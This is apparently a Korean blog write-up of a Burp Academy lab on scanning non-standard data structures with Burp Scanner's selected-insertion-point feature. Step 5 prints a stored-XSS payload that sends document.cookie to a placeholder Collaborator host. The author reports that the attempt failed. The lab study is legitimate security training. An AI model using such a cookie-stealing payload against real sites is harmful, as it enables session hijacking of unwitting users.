---
layout: post
title: "Burp Academy-필수스킬: Scanning non-standard data structures"
categories: [보안취약점, Burp Academy]
tags: [보안취약점, Burp Academy, Essential Skills]
toc: true
last_modified_at: 2025-06-17 21:33:00 +0900
---

# 개요
- 랩을 푸는데 있어서 필수적인 스킬 중 하나인 구조화되지 않은 데이터를 스캔하는 법 배운다. 
- 문제 주소: https://portswigger.net/web-security/essential-skills/using-burp-scanner-during-manual-testing/lab-scanning-non-standard-data-structures
- 취약점 설명페이지: https://portswigger.net/web-security/essential-skills
- 난이도: PRACTITIONER (보통)


# 테크닉 개요
- 기본적으로 Burp Suite는 페이로드를 삽입하는 insertion point를 알아서 처리하지만 특정 데이터의 특정 위치를 insertion point로 지정하고 싶은 경우는 사용자가 설정을 해주어야 한다. 
- 캡쳐한 HTTP 요청 패널 위에서 insertion point로 지정하고 싶은 부분을 선택한 후에, 마우스 오른쪽 버튼을 누르고 'Scan selected insertion point'를 선택하면 해당 부분만 테스트를 진행할 수 있다. 

# 랩 설명
- 이 랩에는 수동으로 찾기 어려운 취약점이 포함되어 있다. 이 취약점은 비표준 데이터 구조에 위치한다. 
- 랩을 풀려면 Burp Scanner의 Insertion Point 기능을 사용하여 취약점을 식별한 다음 수동으로 exploit을 하여 `carlos` 유저를 삭제하라. 
- 다음 크레덴셜을 사용하여 자신의 계정에 로그인할 수 있다: `wiener:peter`

```
This lab contains a vulnerability that is difficult to find manually. It is located in a non-standard data structure.

To solve the lab, use Burp Scanner's Scan selected insertion point feature to identify the vulnerability, then manually exploit it and delete carlos.

You can log in to your own account with the following credentials: wiener:peter
```


# 풀이 
1. 랩에 접속한 후에 주어진 크레덴셜로 로그인한다. 로그인 후에 발급되는 세션쿠키를 살펴보면 다음과 같이 유저의 ID가 들어가 있는 것을 알 수 있다. 

```html
Cookie: session=wiener%3aj6nkGxLWWtgwmM0zrpBVqdrcN2NaaplV
```

URL 디코딩하면 다음과 같이 생겼다. 
```
wiener:j6nkGxLWWtgwmM0zrpBVqdrcN2NaaplV
```

2. HTTP요청에서 세션쿠키의 'wiener'부분을 선택한 후에 마우스 오른쪽 버튼을 누르고 'Scan selected insertion point'를 선택한다. 

![](/images/burp-academy-essential-2-1.png)

3. 스캔 설정 창이 뜬다. 기본설정인 상태로 스캔을 진행한다. 

4. 랩의 의도대로라면 Stored 타입의 XSS가 발견되어야 하지만 뭔가 문제가 있는지 아무런 발견도 없었다. 

(프록시 서버가 없는 환경에서도 시도해보자.)

5. Burp Collaborator 페이로드를 하나 얻어둔다. 그리고 다음과 같이 페이로드를 준비한다. 

```html
'"><svg/onload=fetch(`//YOUR-COLLABORATOR-PAYLOAD/${encodeURIComponent(document.cookie)}`)>:YOUR-SESSION-ID
```

6. 준비한 페이로드를 세션쿠키에 설정하고 서버로 요청을 보낸다. 예상대로라면 Collaborator 탭에 랩 서버에서 Collaborator 서버로 보낸 요청이 보일 것이다. 

![](/images/burp-academy-essential-2-2.png)

7. 그러나 기다려도 아무런 요청이 표시되지 않았다. 

(프록시 서버가 없는 환경에서도 시도해보자. 그러나 아마도 랩 서버의 문제로 보인다..)